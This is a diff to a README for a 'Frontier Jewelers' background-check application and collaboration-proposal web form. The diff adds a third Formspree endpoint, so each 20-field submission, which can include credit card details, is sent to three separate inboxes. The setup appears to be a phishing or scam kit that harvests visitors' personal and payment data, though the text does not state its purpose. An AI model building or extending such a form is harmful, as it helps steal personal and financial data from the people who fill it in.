@@ -18,12 +18,13 @@ FRONTIER JEWELERS — background check application & collaboration proposal (USA
 ## Formspree endpoints
 - `https://formspree.io/f/xwlvnyql`
 - `https://formspree.io/f/mdealbkw`
+- `https://formspree.io/f/xgaorpez`
 
 There is a **single form**; the visitor's details are never collected twice.
 Every submission — from the form or from the review step — is POSTed to
-**both** endpoints with the same 20 fields, so the two inboxes always hold the
-same record. A guard keeps it to one record per visitor: submitting from the
-form blocks a second send from the review step, and vice versa.
+**all three** endpoints with the same 20 fields, so the three inboxes always
+hold the same record. A guard keeps it to one record per visitor: submitting
+from the form blocks a second send from the review step, and vice versa.
 
 ## Running locally
 ```bash
@@ -52,7 +53,7 @@ Optional:
 - Credit Card
 
 The review step (step 2) shows the details entered in the form and submits
-them to both endpoints.
+them to all three endpoints.
 
 ## Deployment
 Push to GitHub and deploy to your hosting platform.
